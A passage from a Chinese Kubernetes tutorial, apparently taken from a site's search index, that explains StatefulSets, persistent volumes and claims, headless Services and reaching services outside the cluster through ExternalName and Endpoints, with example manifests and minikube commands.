ReadOnlyMany\uff08ROX\uff09\uff0c\u53ea\u8bfb\u4f46\u53ef\u4ee5\u88ab\u591a\u4e2a Pod \u6302\u8f7d\uff0c\u4ee5\u53ca ReadWriteMany\uff08RWX\uff09\uff0c\u53ef\u8bfb\u53ef\u5199\uff0c\u53ef\u4ee5\u88ab\u591a\u4e2a Pod \u6302\u8f7d\u3002RWX \u9700\u8981\u624b\u52a8\u4fdd\u6301\u6570\u636e\u4e00\u81f4\u6027\u3002 hostPath \u662f\u6307\u5c06\u8fd9\u4e2a volume \u5b58\u50a8\u5728\u672c\u673a\u7684\u67d0\u4e2a\u8def\u5f84\u4e0b\uff0c\u8fd9\u662f\u5728\u4f7f\u7528 manual \u5b58\u50a8\u7c7b\u65f6\u7684\u4e00\u79cd\u65b9\u5f0f\u3002\u4f46\u662f\u5728\u751f\u4ea7\u73af\u5883\u4e2d\uff0c\u8981\u4e48\u5c06\u8fd9\u4e2a hostPath \u6620\u5c04\u5230\u4e00\u4e2a\u7f51\u7edc\u5b58\u50a8\u4e2d\uff0c\u8981\u4e48\u4f7f\u7528\u7f51\u7edc\u5b58\u50a8\u7c7b\u3002 \u8fd9\u91cc\u7684 storageClassName \u662f\u540e\u9762\u5c06\u8981\u521b\u5efa\u7684 PersistentVolumeClaim \u7528\u6765\u5339\u914d\u7684\u5b57\u6bb5\u3002 \u5982\u679c\u4f60\u4f7f\u7528\u4e86 helm\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528\u6a21\u7248\u6765\u6267\u884c\u5faa\u73af\uff0c\u6765\u521b\u5efa\u591a\u4e2a PersistentVolume\uff0c\u8fd9\u91cc\u4e0d\u518d\u8d58\u8ff0\u3002 \u521b\u5efa PersistentVolumeClaim \u7136\u540e\u9700\u8981\u521b\u5efa PersistentClaim\uff0cPersistentClaim \u50cf\u662f Persistent Volume \u7684\u94a5\u5319\uff0c\u7528\u6765\u8bf7\u6c42 Persistent Volume\u3002 apiVersion: v1 kind: PersistentVolumeClaim metadata: name: pvc spec: storageClassName: html accessModes: - ReadWriteOnce resources: requests: storage: 16Ki \u8fd9\u91cc\u7684 storageClassName \u662f PersistentVolume \u7684 storageClassName\uff0caccessModes \u662f\u8bbf\u95ee\u6a21\u5f0f\uff0cresources \u662f\u8d44\u6e90\u8bf7\u6c42\uff0c\u8fd9\u91cc\u6211\u4eec\u8bf7\u6c42 16Ki \u7684\u5b58\u50a8\u3002 \u8fd9\u91cc\u6211\u4eec\u521b\u5efa\u4e86\u4e00\u4e2a storageClassName \u4e3a html \u7684 PersistentVolumeClaim\uff0c\u8fd9\u4e2a PersistentVolumeClaim \u4f1a\u8bf7\u6c42\u4e00\u4e2a storageClassName \u4e3a html \u7684 PersistentVolume\u3002 \u5982\u679c\u6211\u4eec\u73b0\u5728\u628a\u5b83\u7ed1\u5230\u4e00\u4e2a Pod \u4e0a\uff0c\u8fd9\u4e2a Pod \u5c31\u4f1a\u7533\u8bf7\u4e00\u4e2a\u540c\u6837 storageClassName \u4e3a html \u7684 PersistentVolume\uff0c\u8fd9\u4e2a PersistentVolume \u4f1a\u88ab\u7ed1\u5b9a\u5230\u8fd9\u4e2a Pod \u4e0a\u3002 \u4f46\u662f\uff0c\u6ce8\u610f\uff0c\u73b0\u5728\u7684 Pod \u5982\u679c\u91cd\u542f\uff0c\u6216\u6709\u65b0\u7684 Pod \u5728\u6c34\u5e73\u6269\u5c55\u4e2d\u4ea7\u751f\uff0c\u8fd9\u4e2a PersistentVolume \u4f1a\u88ab\u91cd\u65b0\u7ed1\u5b9a\u5230\u65b0\u7684 Pod \u4e0a\uff0c\u8fd9\u6837\u6570\u636e\u5c31\u4f1a\u4e22\u5931\uff0c\u540c\u4e00\u7f51\u7edc\u5730\u5740\u7684\u6570\u636e\u4e00\u81f4\u6027\u4e22\u5931\u3002\u56e0\u6b64\u9700\u8981\u4f7f\u7528 StatefulSet \u6765\u4fdd\u8bc1\u6570\u636e\u7684\u4e00\u81f4\u6027\u3002 \u521b\u5efa StatefulSet \u73b0\u5728\u6211\u4eec\u521b\u5efa StatefulSet\u3002\u5982\u679c\u4f60\u4e0d\u719f\u6089 nginx \u7684 docker container\uff0c\u8fd9\u91cc\u662f\u4e00\u4e2a\u53cb\u5584\u7684\u63d0\u9192\uff1anginx \u7684\u9ed8\u8ba4\u7f51\u9875\u662f /usr/share/nginx/html \uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u5c06 PersistentVolume \u6302\u8f7d\u5230\u8fd9\u4e2a\u8def\u5f84\u4e0b\u3002 Stateful \u548c Deployment \u76f8\u4f3c\u5904\u6211\u4eec\u4e0d\u518d\u8d58\u8ff0\u3002 apiVersion: apps/v1 kind: StatefulSet metadata: name: html-stateful-set spec: serviceName: \"html-service\" replicas: 2 selector: matchLabels: app: html-pod template: metadata: labels: app: html-pod spec: containers: - name: nginx image: nginx volumeMounts: - name: html-pvc mountPath: /usr/share/nginx/html volumeClaimTemplates: - metadata: name: html-pvc spec: accessModes: [ \"ReadWriteOnce\" ] storageClassName: html resources: requests: storage: 16Ki \u8fd9\u91cc\u6211\u4eec\u521b\u5efa\u4e86\u4e00\u4e2a StatefulSet\uff0c\u540d\u5b57\u4e3a html-statefulset\uff0c\u8fd9\u4e2a StatefulSet \u4f1a\u521b\u5efa\u4e24\u4e2a Pod\uff0c\u6bcf\u4e00\u4e2a Pod \u90fd\u4f1a\u6302\u8f7d\u4e00\u4e2a PersistentVolumeClaim\uff0c\u8fd9\u4e2a PersistentVolumeClaim \u4f1a\u8bf7\u6c42\u4e00\u4e2a PersistentVolume\u3002 \u6ce8\u610f\uff0c\u56e0\u4e3a StatefulSet \u9700\u8981\u9010\u4e2a Pod \u8bbf\u95ee\uff0c\u56e0\u6b64\u5fc5\u987b\u4f7f\u7528\u65e0\u5934\u670d\u52a1\u6765\u8bbf\u95ee\u8fd9\u4e24\u4e2a Pod\uff0c\u56e0\u6b64\u9700\u8981\u6307\u5b9a\u670d\u52a1\u540d serviceName \u4e3a html-service\u3002 \u6302\u8f7d volume \u65f6\uff0cname \u548c volumeClaimTemplates \u7684 name \u9700\u8981\u5339\u914d\u5373\u53ef\u3002 \u521b\u5efa Headless Service \u6700\u540e\uff0c\u6211\u4eec\u521b\u5efa\u4e00\u4e2a Headless Service\uff0c\u7528\u6765\u8bbf\u95ee\u8fd9\u4e24\u4e2a Pod\u3002Headless Service \u4f1a\u4e3a\u6bcf\u4e00\u4e2a Pod \u5206\u914d\u4e00\u4e2a DNS \u8bb0\u5f55\uff0c\u8fd9\u6837\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 DNS \u8bb0\u5f55\u8bbf\u95ee\u6bcf\u4e00\u4e2a Pod\u3002 apiVersion: v1 kind: Service metadata: name: html-service spec: clusterIP: None selector: app: html-pod \u8fd9\u91cc\u6211\u4eec\u521b\u5efa\u4e86\u4e00\u4e2a Headless Service\uff0c\u540d\u5b57\u4e3a html-headless\uff0c\u8fd9\u4e2a Headless Service \u4f1a\u4e3a\u6bcf\u4e00\u4e2a Pod \u5206\u914d\u4e00\u4e2a DNS \u8bb0\u5f55\uff0c\u8fd9\u6837\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 DNS \u8bb0\u5f55\u8bbf\u95ee\u6bcf\u4e00\u4e2a Pod\u3002 \u5916\u90e8\u8bbf\u95ee \u5728\u542f\u52a8\u670d\u52a1\u524d\uff0c\u6211\u4eec\u5148\u8fdb\u5165 minikube ssh \uff0c\u7136\u540e\u5728\u524d\u9762\u6307\u5b9a\u7684 hostPath \u521b\u5efa\u4e24\u4e2a\u5185\u5bb9\u4e0d\u540c\u7684 index.html \u3002\u6ce8\u610f\uff0c\u8fd9\u65f6\u5019\u5bb9\u5668\u5185\u6ca1\u6709\u6587\u672c\u7f16\u8f91\u5668\uff0c\u4f7f\u7528 echo \u547d\u4ee4\u6765\u521b\u5efa\u6587\u4ef6\u3002\u5982\u679c\u4f60\u4e4b\u524d\u5df2\u7ecf\u542f\u52a8\u4e86\uff0c\u4f7f\u7528 kubectl delete all --all \u5220\u9664\u6240\u6709\u8d44\u6e90\u3002\u6b64\u5916\uff0c\u4f60\u8fd8\u9700\u8981\u7528 sudo \u63d0\u6743\u3002 echo \"<h1>html-0</h1>\" | sudo tee ./index.html \u7136\u540e\uff0c\u6211\u4eec\u542f\u52a8\u670d\u52a1\u3002 kubectl apply -f . \u73b0\u5728\u6211\u4eec\u9700\u8981\u5355\u72ec\u8bbf\u95ee Pod\u3002\u5f53\u5904\u4e8e Headless \u6a21\u5f0f\u65f6\uff0cService \u4f1a\u5728 DNS \u8bb0\u5f55\u6bcf\u4e2a Pod \u7684 IP \u5730\u5740\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 kubectl get pods -o wide \u6765\u67e5\u770b Pod \u7684 IP \u5730\u5740\u3002 kubectl get pods -o wide \u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u8fdb\u5165\u96c6\u7fa4\uff0c\u76f4\u63a5\u8bbf\u95ee Pod \u7684 IP \u5730\u5740\u3002\u53ef\u4ee5\u53d1\u73b0\u5b83\u4eec\u6b63\u786e\u5730\u8fd4\u56de\u4e86\u4e0d\u540c\u7684\u7f51\u9875\u3002 \u4f46\u662f\uff0c\u5982\u679c\u662f\u5728\u5199\u540e\u7aef\u670d\u52a1\uff0c\u6211\u4eec\u4e0d\u53ef\u80fd\u4f7f\u7528 IP \u5730\u5740\u6765\u8bbf\u95ee\u3002\u4e4b\u524d\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 Service \u540d\u79f0\u4f5c\u4e3a DNS \u8bb0\u5f55\u6765\u8bbf\u95ee\uff0c\u73b0\u5728\u4e5f\u4e00\u6837\uff0c\u53ef\u4ee5\u7528\u7279\u6b8a\u7684\u7f51\u7edc\u5730\u5740\u6765\u8bbf\u95ee\u8fd9\u4e24\u4e2a Pod\uff0c\u5373 {stateful-set-name}-{ordinal}.{service-name} \u3002\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u5c31\u662f html-stateful-set-0.html-service \u548c html-stateful-set-1.html-service \u3002 curl http://html-stateful-set-0.html-service \u6ce8\u610f\uff0c\u8981\u8fdb\u5165\u4efb\u610f\u4e00\u4e2a\u5728\u96c6\u7fa4\u4e2d\u7684\u5bb9\u5668\uff0c\u53ef\u4ee5\u4f7f\u7528 kubectl exec -it {pod-name} -- /bin/bash \u3002\u8fd9\u6837\u624d\u4f1a\u901a\u8fc7\u96c6\u7fa4\u7684 DNS \u8bb0\u5f55\u6765\u8bbf\u95ee\u3002 \u6709\u72b6\u6001\u670d\u52a1\u5916\u90e8\u90e8\u7f72 \u5728\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u4ecb\u7ecd\u4e86\u5982\u4f55\u7528 k8s \u90e8\u7f72\u6709\u72b6\u6001\u670d\u52a1\u3002\u4f46\u662f\uff0c\u5b9e\u9645\u4e0a\uff0c\u5927\u90e8\u5206\u6709\u72b6\u6001\u670d\u52a1\u90fd\u662f\u90e8\u7f72\u5728\u4e13\u95e8\u7684\u6570\u636e\u5e93\u96c6\u7fa4\u4e2d\uff0c\u800c\u4e0d\u662f\u76f4\u63a5\u90e8\u7f72\u5728 k8s \u4e2d\u3002 \u4f7f\u7528 k8s \u90e8\u7f72\u6709\u72b6\u6001\u670d\u52a1\u7684\u4f18\u70b9\u662f\uff0c\u53ef\u4ee5\u4f7f\u7528 k8s \u7684\u81ea\u52a8\u5316\u90e8\u7f72\uff0c\u81ea\u52a8\u5316\u6269\u5c55\uff0c\u4ee5\u53ca\u81ea\u52a8\u5316\u6062\u590d\u3002\u4f46\u662f\uff0c\u7f3a\u70b9\u662f\uff0ck8s \u5e76\u4e0d\u662f\u4e00\u4e2a\u4e13\u95e8\u7684\u6570\u636e\u5e93\u96c6\u7fa4\uff0c\u56e0\u6b64\u5728\u6570\u636e\u7684\u5907\u4efd\uff0c\u6062\u590d\uff0c\u4ee5\u53ca\u6570\u636e\u7684\u6301\u4e45\u5316\u4e0a\uff0c\u53ef\u80fd\u4f1a\u6709\u4e00\u4e9b\u95ee\u9898\u3002\u6b64\u5916\uff0ck8s \u7684\u5bb9\u5668\u5316\u4e5f\u4f1a\u5e26\u6765 IO \u6027\u80fd\u7684\u635f\u5931\uff0c\u800c\u6709\u72b6\u6001\u670d\u52a1\u5927\u591a\u662f IO \u5bc6\u96c6\u578b\u7684\u670d\u52a1\u3002 \u56e0\u6b64\uff0c\u8fd8\u6709\u4e00\u79cd\u89e3\u51b3\u65b9\u6848\uff0c\u5728 k8s \u5916\u90e8\u90e8\u7f72\u6709\u72b6\u6001\u670d\u52a1\uff0c\u7136\u540e k8s \u96c6\u7fa4\u5185\u5bb9\u5668\u53bb\u8bbf\u95ee\u8fd9\u4e2a\u6709\u72b6\u6001\u670d\u52a1\u3002\u8fd9\u6837\uff0c\u5c31\u53ef\u4ee5\u5145\u5206\u5229\u7528 k8s \u7684\u81ea\u52a8\u5316\u90e8\u7f72\uff0c\u81ea\u52a8\u5316\u6269\u5c55\uff0c\u4ee5\u53ca\u81ea\u52a8\u5316\u6062\u590d\uff0c\u540c\u65f6\u53c8\u53ef\u4ee5\u4f7f\u7528\u4e13\u95e8\u7684\u6570\u636e\u5e93\u96c6\u7fa4\u6765\u7ba1\u7406\u6570\u636e\u3002k8s \u5185\u90e8\u7684\u670d\u52a1\u5c31\u662f\u7eaf\u7cb9\u7684\u65e0\u72b6\u6001\u670d\u52a1\uff0c\u53ea\u9700\u8981\u8bbf\u95ee\u5916\u90e8\u7684\u6709\u72b6\u6001\u670d\u52a1\u3002 \u6709\u72b6\u6001\u670d\u52a1\u5916\u90e8\u90e8\u7f72 \u9996\u5148\u6211\u4eec\u5728\u5916\u90e8\u90e8\u7f72\u4e00\u4e2a nginx\uff0c\u7136\u540e\u5728 k8s \u96c6\u7fa4\u4e2d\u8bbf\u95ee\u8fd9\u4e2a nginx\u3002 \u9996\u5148\uff0c\u6211\u4eec\u5728\u5916\u90e8\u90e8\u7f72\u4e00\u4e2a nginx\u3002 docker run -d --name nginx -p 8080:80 nginx \u6ce8\u610f\uff0c\u8fd9\u91cc\u7684\u5916\u90e8\u662f\u76f8\u5bf9\u96c6\u7fa4\u7684\u5916\u90e8\uff0c\u5373 minikube ssh \u8fdb\u5165\u7684\u865a\u62df\u673a\u3002k8s \u96c6\u7fa4\u548c minikube \u7684\u865a\u62df\u673a\u662f\u5728\u4e00\u4e2a\u7f51\u7edc\u4e2d\u7684\uff0c\u4f46\u5bbf\u4e3b\u673a\u548c\u865a\u62df\u673a\u5728 MacOS \u548c Windows \u4e0a\u662f\u4e0d\u540c\u7684\u7f51\u7edc\uff0c\u56e0\u6b64\u4e0d\u80fd\u76f4\u63a5\u8bbf\u95ee\u3002\u5728\u751f\u4ea7\u73af\u5883\u4e2d\uff0c\u4f7f\u7528 linux \u7cfb\u7edf\uff0c\u6ca1\u6709\u865a\u62df\u673a\uff0ck8s \u53ef\u4ee5\u76f4\u8fde\u5bbf\u4e3b\u673a\u3002 \u7136\u540e\uff0c\u6211\u4eec\u5728 k8s \u96c6\u7fa4\u4e2d\u8bbf\u95ee\u8fd9\u4e2a nginx\u3002\u6211\u4eec\u4e4b\u524d\u6ca1\u6709\u8bb2\u8fc7\u7684 ExternalName \u5c31\u80fd\u7528\u4e0a\u4e86\u3002\u5b83\u80fd\u628a k8s \u96c6\u7fa4\u5916\u7684\u670d\u52a1\u6620\u5c04\u5230 k8s \u96c6\u7fa4\u5185\u7684\u670d\u52a1\u3002\u56e0\u4e3a\u6211\u4eec\u7684 nginx \u662f\u8fd0\u884c\u5728 localhost:8080 \uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 ExternalName \u6765\u6620\u5c04\u8fd9\u4e2a\u670d\u52a1\u3002 apiVersion: v1 kind: Service metadata: name: ext spec: type: ExternalName externalName: localhost ports: - port: 80 \u73b0\u5728\uff0c\u4f7f\u7528 curl http://ext \u5c31\u53ef\u4ee5\u8bbf\u95ee\u5230\u5916\u90e8\u7684 nginx \u4e86\u3002\u5982\u679c\u8981\u8bbf\u95ee\u5176\u5b83\u7684\u670d\u52a1\uff0c\u4e5f\u662f\u540c\u7406\u3002 \u4f46\u662f\uff0c\u6709\u65f6\u5019\u6211\u4eec\u7684\u5916\u90e8\u670d\u52a1\u662f IP\uff0c\u8fd9\u79cd\u65f6\u5019\u8981\u4f7f\u7528 Endpoints\u3002Endpoints \u5176\u5b9e\u662f Service \u7684\u540e\u7aef\uff0cService \u7684 Selector \u5176\u5b9e\u662f\u57fa\u4e8e\u9009\u62e9\u7684 Pod \u521b\u5efa\u4e86\u4e00\u4e2a Endpoints\uff0c\u7136\u540e\u518d\u521b\u5efa Service\u3002 \u8981\u624b\u52a8\u521b\u5efa Endpoints\uff0c\u4f7f\u7528\u4e0b\u9762\u7684\u914d\u7f6e\u6587\u4ef6\uff0c apiVersion: v1 kind: Endpoints metadata: name: ext subsets: - addresses: - ip: 172.0.0.1 ports: - port: 80 \u7136\u540e\u662f Headless\uff0c\u6ce8\u610f\u6211\u4eec\u4e0d\u8981\u5199 selector\uff0cService \u7684\u540d\u5b57\u8981\u4e0e Endpoint \u7684\u540d\u5b57\u4e00\u81f4\u3002 apiVersion: v1 kind: Service metadata: name: ext spec: ports: - protocol: TCP port: 80 targetPort: 80 \u7136\u540e\u76f4\u63a5\u8bbf\u95ee\u670d\u52a1\u5373\u53ef\uff0c\u6548\u679c\u662f\u4e00\u6837\u7684\u3002","title":"k8s \u6709\u72b6\u6001\u670d\u52a1"},{"location":"23/#ch23-k8s","text":"\u524d\u9762\u6211\u4eec\u8bb2\u89e3\u4e86\u65e0\u72b6\u6001\u670d\u52a1\u7684\u90e8\u7f72\u3002\u4f46\u662f\uff0c\u73b0\u5b9e\u4e2d\u5927\u90e8\u5206\u7684\u670d\u52a1\u90fd\u662f\u6709\u72b6\u6001\u7684\uff0c\u4f8b\u5982\u6570\u636e\u5e93\uff0c\u9700\u8981\u6301\u4e45\u5316\u7684\u6d88\u606f\u961f\u5217\uff0c\u4ee5\u53ca\u9700\u8981\u6301\u4e45\u5316\u7684\u7f13\u5b58\u7b49\u7b49\u3002\u8fd9\u4e9b\u670d\u52a1\u7684\u90e8\u7f72\u548c\u7ba1\u7406\u90fd\u6709\u4e00\u4e9b\u7279\u6b8a\u7684\u8981\u6c42\u3002 \u5728 k8s \u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528\u6709\u72b6\u6001\u7ec4\u4ef6 StatefulSet \u6765\u90e8\u7f72\u6709\u72b6\u6001\u670d\u52a1\u3002StatefulSet \u4e0e Deployment \u7c7b\u4f3c\uff0c\u4f46\u662f\u6709\u4e00\u4e9b\u4e0d\u540c\u4e4b\u5904\u3002 \u4f46\u662f\uff0c\u5b9e\u9645\u4e0a\uff0c\u5728\u751f\u4ea7\u73af\u5883\u4e2d\u4e00\u822c\u4f1a\u628a\u6709\u72b6\u6001\u670d\u52a1\u90e8\u7f72\u5728\u4e13\u95e8\u7684\u6570\u636e\u5e93\u96c6\u7fa4\u4e2d\uff0c\u800c\u4e0d\u662f\u76f4\u63a5\u90e8\u7f72\u5728 k8s \u4e2d\u3002\u8fd9\u6837\u53ef\u4ee5\u66f4\u597d\u7684\u7ba1\u7406\u6570\u636e\u5e93\u7684\u5907\u4efd\uff0c\u6062\u590d\uff0c\u4ee5\u53ca\u6570\u636e\u7684\u6301\u4e45\u5316\u3002\u4e24\u79cd\u65b9\u6cd5\u5404\u6709\u4f18\u52a3\uff0c\u5177\u4f53\u60c5\u51b5\u5177\u4f53\u5206\u6790\uff0c\u6211\u4eec\u90fd\u4f1a\u8bb2\u89e3\u3002","title":"\u5fae\u670d\u52a1\u901f\u6210 Ch23 k8s \u6709\u72b6\u6001\u670d\u52a1"},{"location":"23/#_1","text":"k8s \u4e2d\u6709\u72b6\u6001\u5bf9\u8c61\u4e3b\u8981\u6709\u4ee5\u4e0b\u51e0\u4e2a\u3002","title":"\u6709\u72b6\u6001\u5bf9\u8c61"},{"location":"23/#statefulset","text":"StatefulSet \u662f\u6709\u72b6\u6001\u670d\u52a1\u7684\u90e8\u7f72\u5bf9\u8c61\u3002StatefulSet \u4e0e Deployment \u7c7b\u4f3c\uff0c\u4f46\u662f\u6709\u4e00\u4e9b\u4e0d\u540c\u4e4b\u5904\u3002 StatefulSet \u4f1a\u4e3a\u6bcf\u4e2a Pod \u5206\u914d\u4e00\u4e2a\u552f\u4e00\u7684\u6807\u8bc6\u7b26\uff0c\u8fd9\u4e2a\u6807\u8bc6\u7b26\u4f1a\u968f\u7740 Pod \u7684\u91cd\u542f\u800c\u4fdd\u6301\u4e0d\u53d8\u3002 StatefulSet \u4f1a\u6309\u7167\u987a\u5e8f\u542f\u52a8\u548c\u5173\u95ed Pod\uff0c\u8fd9\u6837\u53ef\u4ee5\u4fdd\u8bc1 Pod \u7684\u542f\u52a8\u548c\u5173\u95ed\u987a\u5e8f\u3002 \u8fd9\u4e24\u6761\u7279\u6027\uff0c\u4f7f\u5f97\u6bcf\u4e00\u4e2a Pod \u90fd\u6709\u4e00\u4e2a\u552f\u4e00\u7684\u6807\u8bc6\u7b26\uff0c\u53ef\u4ee5\u7528\u6765\u505a\u4e00\u4e9b\u7279\u6b8a\u7684\u64cd\u4f5c\uff0c\u4f8b\u5982\u6570\u636e\u8fc1\u79fb\uff0c\u6570\u636e\u5907\u4efd\u7b49\u7b49\uff0c\u56e0\u6b64\u53ef\u4ee5\u652f\u63f4\u6709\u72b6\u6001\u670d\u52a1\u7684\u90e8\u7f72\u3002 \u8981\u521b\u5efa\u4e00\u4e2a StatefulSet\uff0c\u901a\u5e38\u9700\u8981\u4e00\u4e2a Headless Service \u4f5c\u4e3a\u7f51\u7edc\u5165\u53e3\uff0c\u4ee5\u53ca\u4e00\u4e2a PersistentVolume \u4f5c\u4e3a\u6570\u636e\u6301\u4e45\u5316\uff0c\u5e76\u7ed9 Pod \u5e26\u4e0a\u5bf9\u5e94\u7684 PersistentVolumeClaim\u3002","title":"StatefulSet"},{"location":"23/#persistentvolume-persistentvolumeclaim","text":"\u524d\u9762\u6211\u4eec\u8bb2\u8fc7\uff0cStatefulSet \u81ea\u5df1\u672c\u8eab\u53ea\u662f\u7ed9\u6bcf\u4e2a Pod \u5206\u914d\u4e00\u4e2a\u552f\u4e00\u7684\u6807\u8bc6\u7b26\uff0c\u4f46\u662f\u5e76\u4e0d\u4f1a\u4fdd\u8bc1\u6570\u636e\u7684\u6301\u4e45\u5316\u3002\u6570\u636e\u7684\u6301\u4e45\u5316\u9700\u8981\u4f7f\u7528 PersistentVolume \u4e0e PersistentVolumeClaim\u3002 PersistentVolume \u662f\u4e00\u4e2a\u72ec\u7acb\u4e8e Pod \u7684\u5b58\u50a8\u5377\uff0c\u53ef\u4ee5\u7528\u6765\u5b58\u50a8\u6570\u636e\u3002PersistentVolumeClaim \u662f\u4e00\u4e2a\u58f0\u660e\uff0c\u7528\u6765\u8bf7\u6c42 PersistentVolume\u3002\u5982\u679c\u6bcf\u4e00\u4e2a Pod \u90fd\u6709\u552f\u4e00\u7684 PersistentVolumeClaim\uff0c\u90a3\u4e48\u6bcf\u4e00\u4e2a Pod \u90fd\u6709\u81ea\u5df1\u7684\u72ec\u7acb\u7684\u5b58\u50a8\u5377\u3002\u8fd9\u6837\uff0c\u5c31\u53ef\u4ee5\u4fdd\u8bc1\u6bcf\u4e00\u4e2a Pod \u7684\u6570\u636e\u662f\u72ec\u7acb\u7684\uff0c\u5b9e\u73b0\u4e86\u6709\u72b6\u6001\u670d\u52a1\u7684\u90e8\u7f72\u3002 \u4f8b\u5982\uff0c\u5982\u679c\u4e00\u4e2a\u96c6\u7fa4\u4e2d\u6709\u4e24\u4e2a\u6570\u636e\u5e93\uff0c\u800c\u6211\u4eec\u5e0c\u671b\u5411\u5916\u63d0\u4f9b\u4e00\u4e2a\u6570\u636e\u5e93\u96c6\u7fa4\u670d\u52a1\uff0c\u5e76\u4f7f\u7528\u5206\u7247\u6280\u672f\u589e\u52a0\u5e76\u53d1\u6570\uff08\u5206\u7247\u662f\u6307\u5c06\u6570\u636e\u5206\u6563\u5230\u591a\u4e2a\u6570\u636e\u5e93\u4e2d\uff0c\u7c7b\u4f3c\u4e8e\u78c1\u76d8\u9635\u5217\u7684 RAID 0\uff09\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 StatefulSet \u90e8\u7f72\u4e24\u4e2a\u6570\u636e\u5e93\uff0c\u6bcf\u4e00\u4e2a\u6570\u636e\u5e93\u90fd\u6709\u81ea\u5df1\u7684 PersistentVolumeClaim\uff0c\u7136\u540e\u4f7f\u7528\u4e00\u4e2a\u7f51\u5173\u5c06\u8bf7\u6c42\u5206\u53d1\u5230\u8fd9\u4e24\u4e2a\u6570\u636e\u5e93\u4e2d\u3002 \u4e3a\u4e86\u8fdb\u4e00\u6b65\u63d0\u9ad8\u5e76\u53d1\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u90e8\u7f72\u4e00\u4e2a Redis \u6765\u7f13\u5b58\u67d0\u6761\u6570\u636e\u5728\u54ea\u4e00\u4e2a\u6570\u636e\u5e93\u4e2d\u3002\u4f46\u662f\uff0c\u4e00\u65e6\u4efb\u4f55\u4e00\u4e2a\u6570\u636e\u5e93\u53d1\u751f\u6545\u969c\uff0c\u5982\u679c\u4f7f\u7528 Deployment \u6a21\u5f0f\uff0c\u5373\u4f7f\u4f7f\u7528\u4e86\u6b63\u786e\u7684\u6301\u4e45\u5316\u6280\u672f\uff0c\u91cd\u542f\u7684 Pod \u4e5f\u4f1a\u6709\u4e0d\u540c\u7684\u6807\u8bc6\u7b26\uff0c\u8fd9\u6837 Redis \u5c31\u4f1a\u5931\u6548\u3002\u56e0\u6b64\uff0c\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528 StatefulSet\uff0c\u6765\u786e\u4fdd\u6bcf\u4e2a Pod \u5728\u91cd\u542f\u524d\u540e\u6709\u76f8\u540c\u7684\u7f51\u7edc\u6807\u8bc6\u4e0e\u6570\u636e\u3002 \u6d88\u606f\u961f\u5217\u4e5f\u662f\u540c\u6837\u7684\u9053\u7406\uff0c\u4f8b\u5982\u5de5\u4f5c\u5728\u6247\u51fa\u6a21\u5f0f\u7684\u6d88\u606f\u961f\u5217\uff0c\u6bcf\u4e00\u4e2a Pod \u90fd\u6709\u81ea\u5df1\u7684\u961f\u5217\u3002\u6b64\u65f6\u9700\u8981\u4e00\u4e2a\u72ec\u7acb\u7684\u6301\u4e45\u5316\u5b58\u50a8\uff0c\u4ee5\u53ca\u4e00\u4e2a\u72ec\u7acb\u7684\u7f51\u7edc\u6807\u8bc6\uff0c\u6765\u4fdd\u8bc1\u91cd\u542f\u524d\u540e\u6570\u636e\u7684\u4e00\u81f4\u6027\u3002","title":"PersistentVolume \u4e0e PersistentVolumeClaim"},{"location":"23/#headless-service","text":"Headless \u662f\u4e00\u79cd\u7279\u6b8a\u7684 Service\u3002\u524d\u9762\u6211\u4eec\u8bb2\u8fc7\uff0cService \u6709\u56db\u79cd\u6a21\u5f0f\uff0c\u800c Headless Service \u662f\u4e00\u79cd\u7279\u6b8a\u7684 ClusterIP Service\uff0c\u5b83\u7684 ClusterIP \u662f None\u3002Headless Service \u4f1a\u4e3a\u6bcf\u4e00\u4e2a Pod \u5206\u914d\u4e00\u4e2a DNS \u8bb0\u5f55\uff0c\u8fd9\u6837\u53ef\u4ee5\u901a\u8fc7 DNS \u8bb0\u5f55\u8bbf\u95ee\u6bcf\u4e00\u4e2a Pod\u3002\u8fd9\u6837\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 DNS \u8bb0\u5f55\u8bbf\u95ee\u6bcf\u4e00\u4e2a Pod\uff0c\u800c\u4e0d\u9700\u8981\u901a\u8fc7 Service \u8bbf\u95ee\u3002","title":"Headless Service"},{"location":"23/#k8s","text":"\u8981\u5728 k8s \u96c6\u7fa4\u4e2d\u90e8\u7f72\u6709\u72b6\u6001\u670d\u52a1\uff0c\u8fd9\u91cc\u6211\u4eec\u7b80\u5355\u5730\u4f7f\u7528\u4e24\u4e2a nginx\uff0c\u5b83\u4eec\u63d0\u4f9b\u7684\u7f51\u9875\u5c06\u4f1a\u4e0d\u540c\u3002\u6211\u4eec\u5c06\u4f7f\u7528 StatefulSet \u6765\u90e8\u7f72\u8fd9\u4e24\u4e2a nginx\uff0c\u4ee5\u53ca\u4e00\u4e2a Headless Service \u6765\u8bbf\u95ee\u8fd9\u4e24\u4e2a nginx\u3002","title":"\u6709\u72b6\u6001\u670d\u52a1 k8s \u90e8\u7f72"},{"location":"23/#persistentvolume","text":"\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u521b\u5efa\u82e5\u5e72 PersistentVolume\u3002\u6211\u4eec\u53ea\u4f1a\u90e8\u7f72\u4e24\u4e2a PostgresQL\uff0c\u56e0\u6b64\u6211\u4eec\u53ea\u9700\u8981\u4e24\u4e2a PersistentVolume\u3002 \u6b64\u5916\uff0c\u524d\u9762\u6211\u4eec\u6ca1\u6709\u63d0\u8fc7\uff0c\u4e00\u4e2a\u6587\u4ef6\u4e2d\u53ef\u4ee5\u901a\u8fc7 --- \u5206\u9694\u7b26\u5206\u9694\u591a\u4e2a\u5bf9\u8c61\u3002 apiVersion: v1 kind: PersistentVolume metadata: name: html-pv-0 spec: storageClassName: html capacity: storage: 1Mi accessModes: - ReadWriteOnce hostPath: path: /mnt/data/html-0 --- apiVersion: v1 kind: 